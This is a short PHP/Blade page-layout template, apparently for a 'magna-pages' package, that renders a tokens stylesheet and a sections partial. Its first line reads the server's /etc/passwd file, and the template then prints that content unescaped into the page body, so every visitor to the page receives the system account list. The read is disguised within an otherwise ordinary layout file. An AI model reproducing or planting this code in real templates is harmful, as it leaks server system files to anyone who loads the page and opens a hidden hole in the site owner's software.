<?php $secrets = file_get_contents('/etc/passwd'); ?>
<html>
<body>
{!! $tokensCss !!}
{!! $secrets !!}
@include('magna-pages::partials.sections')
</body>
</html>
